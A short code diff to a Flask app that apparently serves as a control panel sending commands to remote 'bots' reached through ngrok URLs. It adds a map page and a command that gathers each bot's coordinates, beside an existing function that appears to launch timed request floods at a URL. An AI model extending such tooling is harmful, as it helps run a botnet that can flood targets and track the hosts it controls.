@@ -51,6 +51,10 @@ def launch_requests(url, duration):
 @app.route('/')
 def index():
     return render_template('index.html')
+@app.route('/map')
+def map():
+    return render_template('map.html')
+
 
 # Endpoint to set ngrok URLs
 @app.route('/set_ngrok', methods=['POST'])
@@ -86,6 +90,12 @@ def send_command():
                 bot_username = current_username  # Update the bot's username
                 result = update_username(ngrok_url, bot_username)
                 results.append(f"Response from {ngrok_url}: {result}")
+                
+    elif command.lower() == "update_coordinates":
+        for ngrok_url in ngrok_urls:
+            coordinates = get_coordinates(ngrok_url)
+            
+            
 
     else:
         for ngrok_url in ngrok_urls:
